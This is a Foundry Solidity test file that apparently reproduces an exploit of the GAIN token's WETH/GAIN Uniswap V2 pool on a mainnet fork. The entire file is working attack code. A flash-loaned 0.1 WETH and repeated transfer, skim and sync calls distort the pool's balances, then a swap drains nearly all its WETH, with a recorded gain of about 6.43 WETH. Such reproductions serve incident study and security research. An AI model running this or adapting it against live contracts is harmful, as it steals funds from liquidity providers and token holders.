// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";
import "@interface/IUniswapV3.sol";

WETH9 constant WETH = WETH9(
    payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2))
);
IERC20 constant GAIN = IERC20(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac);
IUniswapV3Pool constant univ3USDT = IUniswapV3Pool(
    0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b
);
IUniswapV2Pair constant WETH_GAIN_Pool = IUniswapV2Pair(
    0x31d80EA33271891986D873B397d849A92EF49255
);

contract GainTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19277620 - 1);
        vm.label(address(WETH), "WETH");
        vm.label(address(univ3USDT), "Uniswap V3: USDT");
        vm.label(address(WETH_GAIN_Pool), "Uniswap V2: GAIN");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        WETH.approve(address(this), type(uint256).max);

        print("Before WETH", WETH.balanceOf(address(this)), 18);

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 0.1 ether;
        bytes memory userData = "";

        univ3USDT.flash(address(this), 0.1 ether, 0, userData);

        print("After WETH", WETH.balanceOf(address(this)), 18);
        // After WETH: 6.432936950955627431
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes memory data
    ) external {
        fee1;
        data;

        WETH.transfer(address(WETH_GAIN_Pool), 0.1 ether);
        WETH_GAIN_Pool.swap(0, 100_000, address(this), "");

        GAIN.transfer(address(WETH_GAIN_Pool), 100);
        WETH_GAIN_Pool.skim(address(this));
        WETH_GAIN_Pool.sync();

        GAIN.transfer(address(WETH_GAIN_Pool), 188);
        WETH_GAIN_Pool.skim(address(this));
        WETH_GAIN_Pool.sync();

        GAIN.transfer(address(WETH_GAIN_Pool), 130_000_000_000_000);
        uint leave_dust = WETH.balanceOf(address(WETH_GAIN_Pool)) -
            WETH.balanceOf(address(WETH_GAIN_Pool)) /
            100;

        print("leave_dust", leave_dust, 18);

        WETH_GAIN_Pool.swap(leave_dust, 0, address(this), "");

        WETH.transfer(address(univ3USDT), 0.1 ether + fee0);
    }
}
